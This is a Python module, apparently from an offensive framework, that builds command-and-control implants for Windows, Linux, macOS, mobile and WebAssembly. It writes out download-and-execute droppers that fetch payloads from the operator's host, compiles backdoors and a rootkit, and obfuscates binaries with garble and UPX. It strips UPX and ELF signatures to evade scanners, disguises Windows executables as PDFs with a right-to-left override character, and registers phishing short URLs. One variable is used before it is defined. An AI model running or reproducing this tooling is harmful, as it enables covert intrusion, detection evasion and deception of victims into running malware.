"""C2 agent builder with profile-driven compilation and safe templating.

Extracted from ``LazyOwnShell.do_c2`` to reduce the 520-line god-method
into a testable, profile-driven builder.
"""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import tempfile
import time
from contextlib import contextmanager
from dataclasses import dataclass, field
from datetime import datetime
from string import Template
from typing import Any, Callable

from core.console import CYAN, RED, RESET
from core.validators import check_lhost, check_lport
from modules.metrics import REGISTRY
from utils import (
    check_go_tool_installed,
    copy2clip,
    is_binary_present,
    is_exist,
    is_port_in_use,
    print_error,
    print_msg,
    print_warn,
)

_GO_CANDIDATE_PATHS = (
    "/usr/local/go/bin/go",
    os.path.expanduser("~/go/bin/go"),
    "/usr/bin/go",
    "/usr/local/bin/go",
)


def _resolve_go_bin() -> str:
    """Return the full path to the go binary.

    Checks shutil.which first, then known installation directories.
    Returns the bare name 'go' as a last resort so error messages stay readable.
    """
    found = shutil.which("go")
    if found:
        return found
    for candidate in _GO_CANDIDATE_PATHS:
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    return "go"


def _ensure_go(cmd_fn: Callable[[str], Any]) -> str:
    """Guarantee a go binary is available, installing via apt if needed.

    Returns the resolved path to go so callers can build explicit commands.
    """
    go_bin = _resolve_go_bin()
    if go_bin != "go" or shutil.which("go"):
        return go_bin
    print_warn("go not found — installing golang via apt-get...")
    cmd_fn("apt-get install -y golang-go 2>&1 | tail -5")
    go_bin = _resolve_go_bin()
    if go_bin == "go" and not shutil.which("go"):
        print_error("go installation failed. Install Go manually: https://go.dev/dl/")
    return go_bin


@dataclass(frozen=True)
class C2Profile:
    """Compilation profile for a target platform."""

    name: str
    goos: str
    goarch: str
    cc: str | None
    cgo: int
    ext: str
    loader: str
    user_agent_key: str
    required_tools: list[str] = field(default_factory=list)


C2_PROFILES: dict[str, C2Profile] = {
    "windows": C2Profile(
        name="windows",
        goos="windows",
        goarch="amd64",
        cc="x86_64-w64-mingw32-gcc",
        cgo=1,
        ext=".exe",
        loader="loader_windows.go",
        user_agent_key="user_agent_win",
        required_tools=["go", "x86_64-w64-mingw32-gcc", "upx"],
    ),
    "linux": C2Profile(
        name="linux",
        goos="linux",
        goarch="amd64",
        cc="gcc",
        cgo=1,
        ext="",
        loader="loader_linux.go",
        user_agent_key="user_agent_lin",
        required_tools=["go", "gcc", "upx"],
    ),
    "darwin": C2Profile(
        name="darwin",
        goos="darwin",
        goarch="amd64",
        cc="x86_64-apple-darwin",
        cgo=1,
        ext="",
        loader="loader_linux.go",
        user_agent_key="user_agent_win",
        required_tools=["go"],
    ),
    "android": C2Profile(
        name="android",
        goos="android",
        goarch="arm64",
        cc=None,
        cgo=1,
        ext="",
        loader="loader_linux.go",
        user_agent_key="user_agent_lin",
        required_tools=["go", "upx"],
    ),
    "ios": C2Profile(
        name="ios",
        goos="ios",
        goarch="arm64",
        cc="x86_64-apple-darwin",
        cgo=1,
        ext="",
        loader="loader_linux.go",
        user_agent_key="user_agent_lin",
        required_tools=["go", "upx"],
    ),
    "webassembly": C2Profile(
        name="webassembly",
        goos="js",
        goarch="wasm",
        cc=None,
        cgo=1,
        ext="",
        loader="loader_linux.go",
        user_agent_key="user_agent_lin",
        required_tools=["go", "upx"],
    ),
}


def _preflight(profile: C2Profile) -> bool:
    """Check that all required external binaries are present."""
    missing = [t for t in profile.required_tools if not is_binary_present(t)]
    if missing:
        print_error(
            f"Missing required tools for {profile.name}: {', '.join(missing)}"
        )
        return False
    return True


def _render_template(content: str, context: dict[str, Any]) -> str:
    """Render a template using ``string.Template`` (safe substitution)."""
    return Template(content).safe_substitute(context)


@contextmanager
def _build_context(sessions_dir: str):
    """Backup ``sessions_dir`` before build and restore on failure."""
    backup = tempfile.mkdtemp(prefix="c2_backup_")
    try:
        for item in os.listdir(sessions_dir):
            s = os.path.join(sessions_dir, item)
            d = os.path.join(backup, item)
            if os.path.isdir(s):
                shutil.copytree(s, d, dirs_exist_ok=True)
            else:
                shutil.copy2(s, d)
    except Exception:
        pass
    try:
        yield
    except Exception:
        try:
            for item in os.listdir(backup):
                s = os.path.join(backup, item)
                d = os.path.join(sessions_dir, item)
                if os.path.isdir(s):
                    shutil.copytree(s, d, dirs_exist_ok=True)
                else:
                    shutil.copy2(s, d)
        except Exception:
            pass
        raise
    finally:
        shutil.rmtree(backup, ignore_errors=True)


class C2Builder:
    """Build C2 agents for multiple platforms."""

    def __init__(
        self,
        params: dict[str, Any],
        sessions_dir: str,
        cmd_fn: Callable[[str], Any],
        onecmd_fn: Callable[[str], Any],
        toastr_fn: Callable[[str, str], Any],
        c2_user: str,
        c2_pass: str,
    ):
        self.params = params
        self.sessions_dir = sessions_dir
        self.cmd = cmd_fn
        self.onecmd = onecmd_fn
        self.toastr = toastr_fn
        self.c2_user = c2_user
        self.c2_pass = c2_pass

    def run(self, line: str, choice: str | None, use_tunnel: bool) -> dict[str, Any]:
        """Execute the full C2 build pipeline.

        Returns a dict with build artefacts and metadata so the caller can
        update shell state (``c2_url``, ``c2_clientid``, ``c2_auth``).
        """
        start_time = time.monotonic()
        path = os.getcwd()
        lport_param = str(self.params["c2_port"])

        if use_tunnel:
            tunnel_cmd = """link=$(grep -o 'https://[-0-9a-z]*\\.trycloudflare.com' "cf.log")
echo "Cloudflare Tunnel URL: $link"
"""
            os.system(tunnel_cmd)
            lhost = input(
                "Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): "
            ).strip()
            lport = "443"
        else:
            lhost = self.params["lhost"]
            lport = lport_param

        rport = str(self.params["rport"])
        listener = str(self.params["listener"])
        sleep = str(self.params["sleep"])
        maleable = self.params["c2_maleable_route"]
        user_agent_win = self.params["user_agent_win"]
        user_agent_lin = self.params["user_agent_lin"]
        user_agent_1 = self.params["user_agent_1"]
        user_agent_2 = self.params["user_agent_2"]
        user_agent_3 = self.params["user_agent_3"]
        url_trafic_1 = self.params["url_trafic_1"]
        url_trafic_2 = self.params["url_trafic_2"]
        url_trafic_3 = self.params["url_trafic_3"]
        random_bytes = os.urandom(100)
        random_string = base64.b64encode(random_bytes).decode("utf-8")[:12]
        working_dir = f"{path}/sessions/"

        if not choice:
            choice = (
                input(
                    "    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : "
                )
                or "1"
            )

        platform_map = {
            "1": "windows",
            "2": "linux",
            "3": "windows",
            "4": "darwin",
            "5": "android",
            "6": "ios",
            "7": "webassembly",
        }
        platform = platform_map.get(choice, "windows")
        profile = C2_PROFILES[platform]

        if choice == "1":
            payload = (
                f"powershell -c \"Invoke-WebRequest 'http://{lhost}/stub.exe' "
                f"-OutFile 'stub.exe'; Start-Process 'stub.exe'\""
            )
            print_msg(payload)
            self.onecmd(f"encodewinbase64 {payload}")
            user_agent = user_agent_win
        elif choice == "2":
            payload = f"""curl http://{lhost}/stub -o /tmp/stub && \
[ -s /tmp/stub ] && \
chmod +x /tmp/stub && \
/tmp/stub""".replace("            ", "")
            cmd = f"echo '{base64.b64encode(payload.encode('utf-8')).decode('utf-8')}' | base64 -d | bash"
            copy2clip(cmd)
            user_agent = user_agent_lin
        elif choice == "3":
            payload = (
                f"powershell iwr -uri  http://{lhost}/batrat.bat -OutFile batrat.bat ; .\\batrat.bat"
            )
            copy2clip(payload)
            user_agent = user_agent_win
        elif choice == "4":
            payload = f"curl http://{lhost}/r -o r && sh r"
            copy2clip(payload)
            user_agent = user_agent_win
        elif choice in ("5", "6", "7"):
            payload = f"curl http://{lhost}/r -o r && sh r"
            copy2clip(payload)
            user_agent = user_agent_lin
        else:
            payload = ""
            user_agent = user_agent_lin

        if not check_lhost(lhost):
            return {}
        if not check_lport(lport):
            return {}

        if not _preflight(profile):
            return {}

        go_bin = _ensure_go(self.cmd)
        if not is_binary_present("garble"):
            self.cmd(f"{go_bin} install github.com/burrowers/garble@latest")
            garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
            gocompiler = f"{go_bin} build"
        else:
            garble_bin = shutil.which("garble") or "garble"
            gocompiler = f"{garble_bin} -literals -tiny build "

        file = f"{path}/modules/run"
        wfile = f"{path}/sessions/win/lazybot.ps1"
        bfile = f"{path}/modules/run.bat"
        filek = f"{path}/modules/backdoor/backdoor.c"
        files = f"{path}/modules/backdoor/server.c"
        cfiles = f"{path}/modules/rootkit/mr.c"
        cwfiles = f"{path}/modules/win_rootkit/win_ring3_rootkit.c"
        mrhyde = f"{path}/modules/win_rootkit/mrhyde.c"
        rootkit_c = f"{path}/modules/rootkit/mrhyde.c"
        file_evil = f"{path}/modules/evilhttprev.sh"
        filer = f"{path}/modules/r.sh"
        gofile = f"{path}/sessions/implant/implant_crypt.go"
        payload_sh = f"{path}/sessions/lin/payload.sh"
        gofile2 = f"{path}/sessions/implant/listener.go"
        gofile4 = f"{path}/sessions/implant/monrevlin.go"
        monrevlin = f"{path}/sessions/monrevlin.go"
        implantgo = f"{path}/sessions/{line}"
        implantgo2 = f"{path}/sessions/l_{line}"
        implant_config_json = f"{path}/sessions/implant_config_{line}.json"

        if not is_exist(file):
            return {}

        # --- Template context shared across all files ---
        with open(f"{path}/sessions/key.aes", "rb") as f:
            aes_key = f.read()
        aes_key_hex = aes_key.hex()

        ctx = {
            "lport": str(lport),
            "rport": str(rport),
            "line": line,
            "lhost": lhost,
            "username": self.c2_user,
            "password": self.c2_pass,
            "platform": platform,
            "sleep": sleep,
            "maleable": maleable,
            "useragent": user_agent,
            "key": aes_key_hex,
            "stealth": "True",
            "user_agent_1": user_agent_1,
            "user_agent_2": user_agent_2,
            "user_agent_3": user_agent_3,
            "url_trafic_1": url_trafic_1,
            "url_trafic_2": url_trafic_2,
            "url_trafic_3": url_trafic_3,
            "listener": listener,
        }

        def _read(path_: str) -> str:
            with open(path_, "r") as f:
                return f.read()

        def _write(path_: str, content: str) -> None:
            with open(path_, "w+") as f:
                f.write(content)

        content = _render_template(_read(file), ctx)
        wcontent = _render_template(_read(wfile), ctx)
        bcontent = _render_template(_read(bfile), ctx)
        cwcontent = _render_template(_read(cwfiles), ctx)
        content_mon = _render_template(_read(cfiles), ctx)
        evil_content = _render_template(_read(file_evil), ctx)
        payload_content = _render_template(_read(payload_sh), ctx)
        rootkit_content = _render_template(_read(rootkit_c), ctx)
        mrhyde_content = _render_template(_read(mrhyde), ctx)

        _write(f"{path}/sessions/mrhyde.c", rootkit_content)
        _write(f"{path}/sessions/mrhydew.c", mrhyde_content)
        _write("sessions/payload.sh", payload_content)
        _write("sessions/wmr.c", cwcontent)
        _write("sessions/mr.c", content_mon)
        _write("sessions/r", content)
        _write("sessions/w", wcontent)
        _write("sessions/ratbat.bat", bcontent)

        backdoor_content = _render_template(_read(filek), ctx)
        _write("sessions/b.c", backdoor_content)

        server_content = _render_template(_read(files), {**ctx, "lhost": rhost})
        _write("sessions/server.c", server_content)

        listener_content = _render_template(_read(file_evil), ctx)
        _write(f"sessions/listener_{line}.sh", listener_content)

        print_msg(
            f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &"
        )

        rcontent = _render_template(_read(filer), ctx)
        _write("sessions/r.sh", rcontent)

        go_content = _render_template(_read(gofile), ctx)
        lcontent = _render_template(_read(gofile2), {**ctx, "lport": str(rport)})
        monrevlin_content = _render_template(_read(gofile4), ctx)

        implant_go = "main.go"
        implant_go2 = implantgo + "_l.go"
        if platform == "windows":
            implantgo += ".exe"
            implantgo2 += "_l.exe"

        beacon = f"sessions/{implant_go}"
        _write(beacon, go_content)
        _write(f"{implant_go2}", lcontent)
        _write(f"{monrevlin}", monrevlin_content)

        # --- Go module setup ---
        self.cmd(
            "cd sessions ; rm go.mod ; go mod init main ; go mod tidy ; cp implant/loader_*.go . ; go get golang.org/x/sys/windows"
        )

        # --- Compilation ---
        binary = f"{line}{profile.ext}"
        compile_flags = '-ldflags="-s -w"'
        if platform == "windows":
            compile_flags = '-ldflags="-s -w -H=windowsgui"'
            tool_to_check = "rsrc"
            if check_go_tool_installed(tool_to_check):
                print_msg(f"Tool '{tool_to_check}' is installed.")
            else:
                print_msg(f"Installing tool '{tool_to_check}'.")
                self.cmd(f"{go_bin} install github.com/akavel/rsrc@latest")
            rsrc_bin = shutil.which("rsrc") or os.path.expanduser("~/go/bin/rsrc")
            self.cmd(f"{rsrc_bin} -ico static/pdf.ico -o sessions/icon.syso")

        cc = f"CC={profile.cc} " if profile.cc else ""
        cgo = f"CGO_ENABLED={profile.cgo} "

        compile_command = (
            f"cd {self.sessions_dir} && {cgo}{cc}GOOS={profile.goos} GOARCH={profile.goarch} "
            f"{gocompiler} {compile_flags} -o {implantgo} {implant_go} {profile.loader}"
        )
        compile_command2 = (
            f"CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
            f"{gocompiler} {compile_flags} -o {implantgo2} {implant_go2}"
        )
        compile_command4 = (
            f"CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
            f"{gocompiler} {compile_flags} -o sessions/monrevlin {monrevlin}"
        )

        self.cmd(compile_command)
        self.cmd(compile_command2)

        if platform == "linux":
            command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread -lssl -lcrypto"
            command_rootkit = f"gcc -fPIC -shared -o {path}/sessions/mrhyde.so -ldl {path}/sessions/mrhyde.c"
            cplib = "cp /lib/x86_64-linux-gnu/libc.so.6 sessions/ && cp /lib64/ld-linux-x86-64.so.2 sessions/"
            self.cmd(command_rootkit)
            self.cmd(command_mon)
            self.cmd(compile_command4)
            self.cmd(cplib)
            self.onecmd(f"service {line}")
            self.onecmd(f"service l_{line}")
            ofuscate = (
                "cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
            )
            self.cmd(ofuscate)
            curl_payload = f"curl -o payload.sh http://{lhost}/payload.sh ; chmod +x payload.sh ; ./payload.sh "
            print_msg(curl_payload)

            with open("sessions/implant/stub_lin.c", "r") as f:
                stub = f.read()
            stub = _render_template(stub, {"lhost": lhost})
            _write("sessions/stub.c", stub)
            self.cmd("gcc -o sessions/stub sessions/stub.c -lcurl && upx sessions/stub")

        elif platform == "windows":
            compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
            command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
            print_msg(
                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`""'
            )
            print_msg(
                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`""'
            )
            print_msg(
                f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`""'
            )
            with open("sessions/implant/stub.c", "r") as f:
                stub = f.read()
            stub = _render_template(stub, {"lhost": lhost})
            _write("sessions/stub.c", stub)
            self.cmd(
                "x86_64-w64-mingw32-gcc -o sessions/stub.exe sessions/stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx sessions/stub.exe"
            )
            self.cmd(compile_cw)
            self.cmd(command_mrhyde)

        self.cmd(f"upx {self.sessions_dir}/{binary}")
        if platform == "linux":
            self.cmd(f"upx {self.sessions_dir}/monrev")

        # --- Anti-UPX / Anti-ELF patching (Linux only in original) ---
        if platform == "linux":
            for target in (line, "monrev"):
                cmd_anti_upx = (
                    'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "'
                    + target
                    + '"'
                )
                cmd_ant_elf = (
                    'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "'
                    + target
                    + '"'
                )
                self.cmd(cmd_anti_upx)
                self.cmd(cmd_ant_elf)

        elif platform == "windows":
            newname = (
                self.sessions_dir
                + "/"
                + binary.split(".")[0]
                + "\u202e"
                + ".pdfx"[::-1]
                + binary.split(".")[1]
            ).encode("utf-8")
            print_msg("New Camuflage File " + str(newname))
            shutil.copy(file, newname)

        # --- Beacon encryption ---
        encbeacon = f"""
python3 -c "
import base64
with open('sessions/{binary}', 'rb') as f:
    data = f.read()
    xor_data = bytes([b ^ 0x33 for b in data])
    b64_data = base64.b64encode(xor_data)
with open('sessions/beacon.enc', 'wb') as f:
    f.write(b64_data)
"
""".replace(
            "        ", ""
        )
        self.toastr(f"Executing... {encbeacon}", type="info")
        os.system(encbeacon)
        print_msg(f"Go agent {implantgo} compiled successfully.")

        # --- MD5 ---
        self.cmd(f"md5sum {self.sessions_dir}/{binary}")

        # --- Metadata JSON ---
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        json_content = {
            "id": random_string,
            "name": line,
            "binary": f"{path}/sessions/{binary}",
            "url_binary": f"http://{lhost}/{binary}",
            "os_id": choice,
            "os": platform,
            "rhost": self.params["rhost"],
            "log": f"{line}.log",
            "user_agent": user_agent,
            "maleable_route": maleable,
            "url": f"https://{lhost}:{lport}",
            "sleep": sleep,
            "username": self.c2_user,
            "password": self.c2_pass,
            "working_path": working_dir,
            "payload": payload,
            "created": now_str,
        }
        with open(implant_config_json, "w+") as f:
            json.dump(json_content, f, indent=4)

        # --- Short URLs ---
        json_file = self.sessions_dir + "/phishing/campaigns/short_urls.json"
        if not os.path.exists(json_file):
            short_urls = {}
        else:
            with open(json_file, "r") as f:
                short_urls = json.load(f)
        if line in short_urls:
            print_warn(f"Entry '{line}' already exists in short urls")
        short_urls[line] = {
            "original_url": f"https://{lhost}/s/{binary}",
            "active": True,
            "created_at": datetime.now().isoformat(),
        }
        with open(json_file, "w") as f:
            json.dump(short_urls, f, indent=2)
        print_msg(f"Created new entry for '{line}' in shorts urls")

        # --- C2 server ---
        self.onecmd("create_session_json")
        server_cmd = f"python3 -W ignore lazyc2.py {lport} {self.c2_user} {self.c2_pass}"

        elapsed = time.monotonic() - start_time
        print_msg(f"Build completed in {elapsed:.1f}s")
        REGISTRY.inc(
            "c2_builds_total",
            labels={"platform": platform, "status": "success"},
        )

        result = {
            "c2_url": f"https://{lhost}:{lport}",
            "c2_clientid": line.strip(),
            "c2_auth": (self.c2_user, self.c2_pass),
            "lhost": lhost,
            "lport": lport,
            "platform": platform,
            "binary": binary,
            "server_cmd": server_cmd,
            "port_in_use": is_port_in_use(int(lport)),
        }
        return result
